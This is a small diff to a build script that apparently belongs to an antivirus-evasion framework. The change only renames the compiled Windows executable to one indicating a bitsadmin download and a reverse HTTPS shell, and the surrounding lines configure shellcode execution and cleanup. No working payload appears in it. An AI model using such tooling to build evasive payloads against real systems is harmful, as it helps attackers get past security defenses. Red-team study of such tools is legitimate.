@@ -48,9 +48,9 @@ set_payload_execution_method exec_shellcode
 # enable debug output
 enable_debug_print to_file C:/users/public/avetdbg.txt
 
-# compile to output.exe file
-$win32_compiler -o output/output.exe source/avet.c
-strip output/output.exe
+# compile to exe file
+$win32_compiler -o output/downloadbitsadmin_revhttps_win32.exe source/avet.c
+strip output/downloadbitsadmin_revhttps_win32.exe
 
 # cleanup
 cleanup_techniques
